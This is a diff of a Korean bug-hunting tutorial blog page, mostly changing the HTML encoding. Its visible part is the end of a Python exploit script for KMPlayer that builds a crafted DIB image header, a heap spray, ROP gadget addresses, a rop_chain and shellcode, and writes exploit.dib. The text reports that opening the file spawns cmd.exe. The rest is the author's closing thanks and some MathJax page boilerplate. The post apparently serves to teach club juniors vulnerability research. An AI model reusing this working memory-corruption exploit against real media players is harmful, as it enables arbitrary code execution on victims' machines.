-BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>] = p(<span class="hljs-number">3</span> * (up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biWidth&#x27;</span>]) *
-up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biHeight&#x27;</span>])))
-BITMAPINFOHEADER[<span class="hljs-string">&#x27;biXPelsPerMeter&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>
-BITMAPINFOHEADER[<span class="hljs-string">&#x27;biYPelsPerMeter&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>
-BITMAPINFOHEADER[<span class="hljs-string">&#x27;biClrUsed&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x02\x00\x00&#x27;</span> <span class="hljs-comment"># origin is 0x00</span>
-BITMAPINFOHEADER[<span class="hljs-string">&#x27;biClrImportant&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00\x00\x00&#x27;</span>
+BITMAPINFOHEADER[<span class="hljs-string">&apos;biSize&apos;</span>] = <span class="hljs-string">&apos;\x28\x1f\x00\x00&apos;</span> <span class="hljs-comment"># origin is 0x28</span>
+BITMAPINFOHEADER[<span class="hljs-string">&apos;biWidth&apos;</span>] = p(<span class="hljs-number">0x1c48</span>)
+BITMAPINFOHEADER[<span class="hljs-string">&apos;biHeight&apos;</span>] = p(<span class="hljs-number">0x1c48</span>)
+BITMAPINFOHEADER[<span class="hljs-string">&apos;biPlanes&apos;</span>] = <span class="hljs-string">&apos;\x01\x00&apos;</span>
+BITMAPINFOHEADER[<span class="hljs-string">&apos;biBitCount&apos;</span>] = <span class="hljs-string">&apos;\x18\x00&apos;</span>
+BITMAPINFOHEADER[<span class="hljs-string">&apos;biCompression&apos;</span>] = <span class="hljs-string">&apos;\x00\x0a\x00\x00&apos;</span> <span class="hljs-comment"># origin is 0x00</span>
+BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>] = p(<span class="hljs-number">3</span> * (up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biWidth&apos;</span>]) *
+up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biHeight&apos;</span>])))
+BITMAPINFOHEADER[<span class="hljs-string">&apos;biXPelsPerMeter&apos;</span>] = <span class="hljs-string">&apos;\x00\x00\x00\x00&apos;</span>
+BITMAPINFOHEADER[<span class="hljs-string">&apos;biYPelsPerMeter&apos;</span>] = <span class="hljs-string">&apos;\x00\x00\x00\x00&apos;</span>
+BITMAPINFOHEADER[<span class="hljs-string">&apos;biClrUsed&apos;</span>] = <span class="hljs-string">&apos;\x00\x02\x00\x00&apos;</span> <span class="hljs-comment"># origin is 0x00</span>
+BITMAPINFOHEADER[<span class="hljs-string">&apos;biClrImportant&apos;</span>] = <span class="hljs-string">&apos;\x00\x00\x00\x00&apos;</span>
 
-BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfType&#x27;</span>] = <span class="hljs-string">&#x27;BM&#x27;</span>
-BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfsize&#x27;</span>] = p(up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) + <span class="hljs-number">0x36</span>)
-BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfReserved1&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00&#x27;</span>
-BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfReserved2&#x27;</span>] = <span class="hljs-string">&#x27;\x00\x00&#x27;</span>
-BITMAPFILEHEADER[<span class="hljs-string">&#x27;bfOffBits&#x27;</span>] = <span class="hljs-string">&#x27;\x36\x00\x00\x00&#x27;</span>
+BITMAPFILEHEADER[<span class="hljs-string">&apos;bfType&apos;</span>] = <span class="hljs-string">&apos;BM&apos;</span>
+BITMAPFILEHEADER[<span class="hljs-string">&apos;bfsize&apos;</span>] = p(up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>]) + <span class="hljs-number">0x36</span>)
+BITMAPFILEHEADER[<span class="hljs-string">&apos;bfReserved1&apos;</span>] = <span class="hljs-string">&apos;\x00\x00&apos;</span>
+BITMAPFILEHEADER[<span class="hljs-string">&apos;bfReserved2&apos;</span>] = <span class="hljs-string">&apos;\x00\x00&apos;</span>
+BITMAPFILEHEADER[<span class="hljs-string">&apos;bfOffBits&apos;</span>] = <span class="hljs-string">&apos;\x36\x00\x00\x00&apos;</span>
 
-head = <span class="hljs-string">&#x27;Fandu_&#x27;</span>
-tail = <span class="hljs-string">&#x27;FANDU_&#x27;</span>
-spray = <span class="hljs-string">&#x27;\x11&#x27;</span>
+head = <span class="hljs-string">&apos;Fandu_&apos;</span>
+tail = <span class="hljs-string">&apos;FANDU_&apos;</span>
+spray = <span class="hljs-string">&apos;\x11&apos;</span>
 stack_to_heap = p(<span class="hljs-number">0x00523702</span>) <span class="hljs-comment"># PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</span>
 heap_to_heap = p(<span class="hljs-number">0x0095ddef</span>) <span class="hljs-comment"># ADD ESP,19000 # POP EDI # POP ESI # POP EBX # RETN</span>
 pivot = p(<span class="hljs-number">0x00433712</span>) <span class="hljs-comment"># POP EDX # POP EDI # POP ESI # POP EBX # RETN</span>
@@ -385,18 +385,18 @@ ret = p(<span class="hljs-number">0x00984e94</span>) <span class="hljs-comment">
 offset1 = <span class="hljs-number">0x11111111</span> - <span class="hljs-number">0x101cb056</span> - <span class="hljs-number">0x600000</span> <span class="hljs-comment"># for calculating size of 0x11 spray</span>
 offset2 = <span class="hljs-number">0x197c0d11</span> - <span class="hljs-number">0x173772e1</span> - <span class="hljs-number">0x100000</span> <span class="hljs-comment"># for skip some data which are mutated</span>
 
-payload = <span class="hljs-string">&#x27;&#x27;</span>
-payload += head +<span class="hljs-string">&#x27;aa&#x27;</span>
+payload = <span class="hljs-string">&apos;&apos;</span>
+payload += head +<span class="hljs-string">&apos;aa&apos;</span>
 payload += spray * offset1
 payload += (heap_to_heap + stack_to_heap) * (<span class="hljs-number">0x400000</span> * <span class="hljs-number">2</span> / <span class="hljs-number">8</span>)
-payload += pivot * ((up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) - len(payload) - offset2 - <span class="hljs-number">0x1000</span> - len(tail)) / <span class="hljs-number">4</span>)
+payload += pivot * ((up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>]) - len(payload) - offset2 - <span class="hljs-number">0x1000</span> - len(tail)) / <span class="hljs-number">4</span>)
 payload += ret * (<span class="hljs-number">0x20000</span> / <span class="hljs-number">4</span>)
 payload += rop_chain
 payload += shellcode
-payload += spray * (up(BITMAPINFOHEADER[<span class="hljs-string">&#x27;biSizeImage&#x27;</span>]) - len(payload)) <span class="hljs-comment">#dummy</span>
+payload += spray * (up(BITMAPINFOHEADER[<span class="hljs-string">&apos;biSizeImage&apos;</span>]) - len(payload)) <span class="hljs-comment">#dummy</span>
 payload += tail
 
-exploit = <span class="hljs-string">&#x27;&#x27;</span>
+exploit = <span class="hljs-string">&apos;&apos;</span>
 
 <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> BITMAPFILEHEADER.keys() :
 	exploit += BITMAPFILEHEADER[key]
@@ -406,17 +406,17 @@ exploit = <span class="hljs-string">&#x27;&#x27;</span>
 
 exploit += payload
 
-f = open(<span class="hljs-string">&#x27;./exploit.dib&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)
+f = open(<span class="hljs-string">&apos;./exploit.dib&apos;</span>, <span class="hljs-string">&apos;wb&apos;</span>)
 f.write(exploit)
 f.close()</code></pre>
 
-<p>그리고 이 파이썬 스크립트를 실행시켜 떨궈진 <code>exploit.dib</code> 파일을 KMPlayer에 넣어 실행하면!!!!</p>
+<p>&#xADF8;&#xB9AC;&#xACE0; &#xC774; &#xD30C;&#xC774;&#xC36C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C; &#xB5A8;&#xAD88;&#xC9C4; <code>exploit.dib</code> &#xD30C;&#xC77C;&#xC744; KMPlayer&#xC5D0; &#xB123;&#xC5B4; &#xC2E4;&#xD589;&#xD558;&#xBA74;!!!!</p>
 <p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--076.png" srcset="/img/loading.gif" alt="bughunting-tutorials-part4/image--076.png"></p>
-<p>이렇게 <code>cmd.exe</code>가 실행됩니다!!! 짝짝짝 ㅎㅎㅎㅎㅎㅎ</p>
-<h1 id="그의-과거의-마지막-잡담"><a href="#그의-과거의-마지막-잡담" class="headerlink" title="그의 (과거의) 마지막 잡담"></a>그의 (과거의) 마지막 잡담</h1><p>으으 드디어 끝났네요 ㅋㅋ 원래 12 월 중순인가 말인가 시작했는 데 1 월에 멘탈이 나가 있어 가지고 이제야 끝났네요 후우… 역시 나 새끼는 게으른 놈….</p>
-<p>원래 이 글을 쓴 이유가 동아리 후배들 교육시키기 위한 것도 있지만 사실 전에 cdpython 형이 이 취약점으로 버그헌팅 글 쓰면 좋을 거 같다고 해서 쓰게 됐습니다 ㅋㅋ 많은 분들에게 도움이 되었으면 좋겠네요. 사실 요즘 너무 잘하는 사람이 많아서 이런 거 보는 사람이 있겠냐만은… 잘하는 사람은 이거 보지도 않겠지… 쥬륵 나도 이제 잘해야지…. ㅋㅋㅋ 근데 일단 졸업부터 하즈아아아아 ㅠㅠㅠㅠ</p>
-<p>그래도 제가 이 정도라도 할 수 있게 채찍질 해준 passket, combabo, cdpython, morinori89 형들 감사합니닼ㅋㅋㅋㅋㅋㅋㅋ 후우…. 사실 형들이랑 제일 많이 한 거는 해킹보다는 술 처먹는 거 같지만…. 그리고 문서 피드백 준 SSG 후배들 Frozenbeer 땡큐땡큐 ㅋㅋㅋ</p>
-<p>그럼 다들 즐햌!!!</p>
+<p>&#xC774;&#xB807;&#xAC8C; <code>cmd.exe</code>&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;!!! &#xC9DD;&#xC9DD;&#xC9DD; &#x314E;&#x314E;&#x314E;&#x314E;&#x314E;&#x314E;</p>
+<h1 id="&#xADF8;&#xC758;-&#xACFC;&#xAC70;&#xC758;-&#xB9C8;&#xC9C0;&#xB9C9;-&#xC7A1;&#xB2F4;"><a href="#&#xADF8;&#xC758;-&#xACFC;&#xAC70;&#xC758;-&#xB9C8;&#xC9C0;&#xB9C9;-&#xC7A1;&#xB2F4;" class="headerlink" title="&#xADF8;&#xC758; (&#xACFC;&#xAC70;&#xC758;) &#xB9C8;&#xC9C0;&#xB9C9; &#xC7A1;&#xB2F4;"></a>&#xADF8;&#xC758; (&#xACFC;&#xAC70;&#xC758;) &#xB9C8;&#xC9C0;&#xB9C9; &#xC7A1;&#xB2F4;</h1><p>&#xC73C;&#xC73C; &#xB4DC;&#xB514;&#xC5B4; &#xB05D;&#xB0AC;&#xB124;&#xC694; &#x314B;&#x314B; &#xC6D0;&#xB798; 12 &#xC6D4; &#xC911;&#xC21C;&#xC778;&#xAC00; &#xB9D0;&#xC778;&#xAC00; &#xC2DC;&#xC791;&#xD588;&#xB294; &#xB370; 1 &#xC6D4;&#xC5D0; &#xBA58;&#xD0C8;&#xC774; &#xB098;&#xAC00; &#xC788;&#xC5B4; &#xAC00;&#xC9C0;&#xACE0; &#xC774;&#xC81C;&#xC57C; &#xB05D;&#xB0AC;&#xB124;&#xC694; &#xD6C4;&#xC6B0;&#x2026; &#xC5ED;&#xC2DC; &#xB098; &#xC0C8;&#xB07C;&#xB294; &#xAC8C;&#xC73C;&#xB978; &#xB188;&#x2026;.</p>
+<p>&#xC6D0;&#xB798; &#xC774; &#xAE00;&#xC744; &#xC4F4; &#xC774;&#xC720;&#xAC00; &#xB3D9;&#xC544;&#xB9AC; &#xD6C4;&#xBC30;&#xB4E4; &#xAD50;&#xC721;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD55C; &#xAC83;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; &#xC0AC;&#xC2E4; &#xC804;&#xC5D0; cdpython &#xD615;&#xC774; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xBC84;&#xADF8;&#xD5CC;&#xD305; &#xAE00; &#xC4F0;&#xBA74; &#xC88B;&#xC744; &#xAC70; &#xAC19;&#xB2E4;&#xACE0; &#xD574;&#xC11C; &#xC4F0;&#xAC8C; &#xB410;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B; &#xB9CE;&#xC740; &#xBD84;&#xB4E4;&#xC5D0;&#xAC8C; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xB124;&#xC694;. &#xC0AC;&#xC2E4; &#xC694;&#xC998; &#xB108;&#xBB34; &#xC798;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xB9CE;&#xC544;&#xC11C; &#xC774;&#xB7F0; &#xAC70; &#xBCF4;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xC788;&#xACA0;&#xB0D0;&#xB9CC;&#xC740;&#x2026; &#xC798;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xC740; &#xC774;&#xAC70; &#xBCF4;&#xC9C0;&#xB3C4; &#xC54A;&#xACA0;&#xC9C0;&#x2026; &#xC96C;&#xB975; &#xB098;&#xB3C4; &#xC774;&#xC81C; &#xC798;&#xD574;&#xC57C;&#xC9C0;&#x2026;. &#x314B;&#x314B;&#x314B; &#xADFC;&#xB370; &#xC77C;&#xB2E8; &#xC878;&#xC5C5;&#xBD80;&#xD130; &#xD558;&#xC988;&#xC544;&#xC544;&#xC544;&#xC544; &#x3160;&#x3160;&#x3160;&#x3160;</p>
+<p>&#xADF8;&#xB798;&#xB3C4; &#xC81C;&#xAC00; &#xC774; &#xC815;&#xB3C4;&#xB77C;&#xB3C4; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xCC44;&#xCC0D;&#xC9C8; &#xD574;&#xC900; passket, combabo, cdpython, morinori89 &#xD615;&#xB4E4; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2FC;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B;&#x314B; &#xD6C4;&#xC6B0;&#x2026;. &#xC0AC;&#xC2E4; &#xD615;&#xB4E4;&#xC774;&#xB791; &#xC81C;&#xC77C; &#xB9CE;&#xC774; &#xD55C; &#xAC70;&#xB294; &#xD574;&#xD0B9;&#xBCF4;&#xB2E4;&#xB294; &#xC220; &#xCC98;&#xBA39;&#xB294; &#xAC70; &#xAC19;&#xC9C0;&#xB9CC;&#x2026;. &#xADF8;&#xB9AC;&#xACE0; &#xBB38;&#xC11C; &#xD53C;&#xB4DC;&#xBC31; &#xC900; SSG &#xD6C4;&#xBC30;&#xB4E4; Frozenbeer &#xB561;&#xD050;&#xB561;&#xD050; &#x314B;&#x314B;&#x314B;</p>
+<p>&#xADF8;&#xB7FC; &#xB2E4;&#xB4E4; &#xC990;&#xD58C;!!!</p>
 
             </div>
             <hr>
@@ -717,6 +717,45 @@ f.close()</code></pre>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
